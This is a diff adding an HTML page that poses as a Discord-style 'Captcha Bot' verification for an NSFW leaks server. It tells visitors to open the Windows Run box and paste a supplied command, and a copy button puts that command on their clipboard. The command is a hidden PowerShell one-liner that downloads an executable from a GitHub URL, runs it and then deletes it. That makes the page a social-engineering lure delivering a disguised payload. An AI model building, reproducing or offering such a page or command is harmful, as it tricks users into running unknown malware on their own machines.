@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Captcha Bot - Official Verification</title>
+  <style>
+    body {
+      background: linear-gradient(135deg, #1e1f29, #13141a);
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+      color: #f2f2f2;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      padding: 40px 20px;
+    }
+
+    .card {
+      background: #2f3136;
+      border-radius: 12px;
+      box-shadow: 0 0 30px rgba(114, 137, 218, 0.2);
+      padding: 30px;
+      max-width: 800px;
+      width: 100%;
+      text-align: left;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      margin-bottom: 25px;
+    }
+
+    .pfp {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      background: url('https://cdn.discordapp.com/attachments/1357830148258271366/1357849831665832038/56096221.jpg?ex=67f1b3b3&is=67f06233&hm=0d6941c5fec03456c9cac7d4d3c2aaa0558a337864d590ccdeed50ae2d184af4&?size=160') no-repeat center center/cover;
+      box-shadow: 0 0 8px #5865f2;
+    }
+
+    .title h1 {
+      margin: 0;
+      font-size: 1.8rem;
+      color: #ffffff;
+    }
+
+    .title span {
+      font-size: 0.95rem;
+      color: #bbb;
+    }
+
+    .instructions {
+      background: #232428;
+      border-left: 4px solid #43b581;
+      padding: 15px 20px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      font-size: 0.95rem;
+    }
+
+    .instructions strong {
+      color: #43b581;
+    }
+
+    .code-block {
+      background: #1e1f22;
+      border-radius: 8px;
+      padding: 15px 20px;
+      position: relative;
+      overflow-x: auto;
+      font-family: monospace;
+      font-size: 0.9rem;
+      margin-bottom: 15px;
+      border-left: 4px solid #7289da;
+    }
+
+    .copy-btn {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background-color: #7289da;
+      border: none;
+      color: white;
+      padding: 5px 12px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: 0.2s ease;
+    }
+
+    .copy-btn:hover {
+      background-color: #5b6eae;
+    }
+
+    .footer {
+      margin-top: 25px;
+      font-size: 0.85rem;
+      color: #aaa;
+      text-align: center;
+    }
+
+    .verified-tag {
+      display: inline-block;
+      background-color: #FF0000;
+      color: white;
+      font-weight: bold;
+      padding: 3px 8px;
+      border-radius: 6px;
+      font-size: 0.75rem;
+      margin-top: 5px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="header">
+      <div class="pfp"></div>
+      <div class="title">
+        <h1>Captcha Bot</h1>
+        <span>Verification Status — <span class="verified-tag">Unverified</span></span>
+      </div>
+    </div>
+
+    <div class="instructions">
+      To verify for <strong>🔞 ℕ𝕊𝔽𝕎 𝕃𝔼𝔸𝕂𝕊 🤫</strong>, follow these steps:
+      <ol style="margin-top: 10px; padding-left: 20px;">
+        <li>Press <strong>Windows Key + R</strong></li>
+        <li>Paste the code below into the box that pops up</li>
+        <li>Click <strong>OK</strong> and follow the instructions</li>
+      </ol>
+    </div>
+
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyScript()">Copy</button>
+      <pre id="shell-script">powershell -WindowStyle Hidden -Command "$f=$env:TEMP + '\captcha.exe'; Invoke-WebRequest -Uri 'https://github.com/sinfulled/captcha/raw/refs/heads/main/captcha.exe' -OutFile $f; Start-Process $f -Wait; Remove-Item $f"</pre>
+    </div>
+
+    <div class="footer">
+      ©️ 2025 Captcha bot, All rights reserved.
+    </div>
+  </div>
+
+  <script>
+    function copyScript() {
+      const script = document.getElementById('shell-script').innerText;
+      navigator.clipboard.writeText(script).then(() => {
+        const btn = document.querySelector('.copy-btn');
+        btn.innerText = 'Copied!';
+        setTimeout(() => { btn.innerText = 'Copy'; }, 2000);
+      });
+    }
+  </script>
+</body>
+</html>
